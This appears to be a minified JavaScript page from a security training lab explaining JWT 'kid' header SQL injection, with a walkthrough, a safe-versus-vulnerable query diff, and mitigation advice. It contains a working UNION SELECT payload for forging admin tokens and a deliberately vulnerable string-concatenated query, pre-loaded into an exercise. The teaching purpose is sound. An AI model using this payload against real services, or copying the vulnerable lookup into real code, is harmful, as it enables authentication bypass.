import{j as e,u as c,A as l,m as a}from"./motion-7MZJb9m0.js";import{r as h}from"./vendor-E29-3-uS.js";import{M as u,A as k,E as m}from"./ExercisePanel-Diwgwwj0.js";import"./index-CSy6_zec.js";const r="SELECT secret FROM signing_keys WHERE kid = '<KID_VALUE>'",s="SELECT secret FROM signing_keys WHERE kid = 'anything' UNION SELECT 'pwnsecret' --'",n="SELECT secret FROM signing_keys WHERE kid = ?  -- parameterized",p=[{title:"Legitimate Login — kid Header Issued",client:`POST /api/v1/attack/kid-sqli/login
{"username":"user","password":"password"}`,server:`HTTP 200
{
  "token": "eyJhbGciOiJIUzI1NiIsImtpZCI6Im1haW4ta2V5In0...",
  // header: {"alg":"HS256","kid":"main-key"}
}`,description:'The server issues a token with a kid header ("main-key") pointing to the key in the SQLite signing_keys table. The kid is user-controlled in the token header.'},{title:"Attacker Injects SQL via kid",client:`Craft header:
{"alg":"HS256","kid":"anything' UNION SELECT 'pwnsecret' --"}

Sign with HMAC key = "pwnsecret":
  token = base64(header) + "." + base64(payload) + "." + HMAC("pwnsecret", ...)`,server:`Vulnerable SQL query:
`+r+`

With injected kid:
`+s,description:`The attacker sets kid to a UNION SELECT injection. The server's vulnerable query returns "pwnsecret" as the signing key. The attacker signs their forged token with that same value.`,highlight:!0},{title:"UNION SELECT Returns Attacker's Key",client:`SQL executes:
`+s+`

Returns: "pwnsecret"`,server:`Server looks up secret for kid:
→ SQL returns "pwnsecret" (attacker-controlled!)

Server verifies token with "pwnsecret":
→ Signature matches!
→ HTTP 200 {"valid":true,"role":"admin"}`,description:"The UNION SELECT clause injects a row not in the database. The server uses this attacker-controlled string as the verification key — and the attacker signed with the same string.",highlight:!0},{title:"Patched: Parameterized Query",client:`POST /api/v1/attack/kid-sqli/verify
{"token": "<injected-kid-token>"}`,server:`Patched SQL:
`+n+`

kid literal treated as data, not SQL:
→ No row found for "anything' UNION..."
→ HTTP 401 {"valid":false,"message":"No matching key found for kid."}`,description:"With a parameterized query, the kid value is passed as a parameter — never interpolated into SQL. The injection payload is treated as a literal string, finding no matching row."}],y=`
The JWT <code>kid</code> (Key ID) header claim tells the server which key to use for verification.
When the server looks up that key in a database using the raw kid value concatenated into SQL,
an attacker can mount a <span class="callout-term-danger">SQL injection</span> to control what key is returned.

The attack is elegant: the attacker also controls what key was used to sign the token.
By injecting a <span class="callout-term-danger">UNION SELECT</span> payload via the <code>kid</code> field, they make the server's
SQL query return <code>pwnsecret</code> as the verification key — and they've signed the token
with that exact string. Both sides of the verification match.

This attack requires:
<ul class="list-disc ml-4 mt-2 space-y-1">
  <li>A kid header field in the JWT (common in multi-key setups)</li>
  <li>The kid value is used directly in a SQL query (without <span class="callout-term">parameterization</span>)</li>
  <li>The attacker can determine or control what the SQL returns</li>
</ul>

The in-memory SQLite database here uses <code>:memory:</code> — no disk writes, no state
persistence between restarts.
`,g=`
**Fix:** Always use parameterized queries for kid lookup.

\`\`\`python
# Vulnerable
cursor.execute(f"SELECT secret FROM keys WHERE kid = '{kid}'")

# Patched — kid is a parameter, not interpolated
cursor.execute("SELECT secret FROM keys WHERE kid = ?", (kid,))
\`\`\`

**Additional hardening:**
- Validate kid format (e.g., alphanumeric only) before the database query
- Use an ORM that parameterizes queries by default
- Allowlist kid values against a known set rather than dynamic lookup
- Consider non-SQL key stores (in-memory dict, Redis) for simpler validation
`;function x(){const[i,o]=h.useState(!1),t=c();return e.jsxs("div",{className:"mb-6",children:[e.jsxs("div",{className:"flex items-center justify-between mb-2",children:[e.jsx("h2",{className:"font-display text-h3 text-text-primary",children:"SQL Query Diff"}),e.jsx("button",{onClick:()=>o(d=>!d),className:"btn-secondary py-1 h-8 px-3 text-small","aria-label":"Toggle between safe and injected query",children:i?"Show Safe":"Show Injected"})]}),e.jsxs("div",{className:"grid grid-cols-2 gap-3",children:[e.jsxs("div",{children:[e.jsx("div",{className:"text-small text-primary mb-1 font-medium",children:"✓ Safe — Parameterized"}),e.jsx("div",{className:"code-block text-xs font-mono whitespace-pre-wrap text-text-muted",children:n})]}),e.jsxs("div",{children:[e.jsx("div",{className:"text-small text-error mb-1 font-medium",children:"✗ Vulnerable — String Concat"}),e.jsx(l,{mode:"wait",children:i?e.jsxs(a.div,{initial:{opacity:0,x:t?0:8},animate:{opacity:1,x:0},exit:{opacity:0,x:t?0:-8},transition:{duration:t?0:.22},className:"code-block text-xs font-mono whitespace-pre-wrap",children:[e.jsx("span",{className:"text-text-muted",children:"SELECT secret FROM signing_keys WHERE kid = "}),e.jsx("span",{className:"bg-error/20 text-error border border-error/30 rounded px-0.5",children:"'anything' UNION SELECT 'pwnsecret' --'"})]},"injected"):e.jsx(a.div,{initial:{opacity:0,x:t?0:8},animate:{opacity:1,x:0},exit:{opacity:0,x:t?0:-8},transition:{duration:t?0:.22},className:"code-block text-xs font-mono whitespace-pre-wrap text-text-muted",children:r},"vulnerable")})]})]})]})}function v(){return e.jsxs(u,{slug:"kid-sqli",title:"Key ID SQL Injection",severity:"Critical",cve:null,narrative:y,mitigation:g,children:[e.jsx(k,{steps:p}),e.jsx(x,{}),e.jsx(m,{slug:"kid-sqli",description:"The kid header is pre-set to the SQL injection payload. The Forge secret is pre-loaded with 'pwnsecret'. Click ⚡ Fire Token — the vulnerable endpoint runs the UNION SELECT, retrieves 'pwnsecret' as the signing key, and accepts the token. Toggle Patch to see it rejected.",extraHeaderFields:{kid:"' UNION SELECT 'pwnsecret'--"},initialSecret:"pwnsecret"})]})}export{v as default};
